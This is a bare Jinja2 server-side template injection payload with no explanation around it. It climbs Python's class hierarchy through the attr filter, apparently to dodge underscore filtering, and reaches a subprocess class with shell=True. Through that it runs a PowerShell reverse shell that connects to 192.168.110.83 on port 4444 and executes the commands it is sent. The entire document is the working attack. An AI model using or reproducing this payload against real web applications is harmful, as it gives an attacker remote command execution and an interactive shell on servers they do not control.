{% set string = "ssti" %} 

{% set class = "\_\_class\_\_" %} 

{% set mro = "\_\_mro\_\_" %} 

{% set subclasses = "\_\_subclasses\_\_" %}

{% set mro\_r = string|attr(class)|attr(mro) %} 

{% set subclasses\_r = mro\_r\[1]|attr(subclasses)() %} 

{{ subclasses\_r\[571]('''powershell -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.110.83',4444);$stream = $client.GetStream();\[byte\[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>\&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = (\[text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"''', shell=True, stdout=-1).communicate()\[0].strip()}}

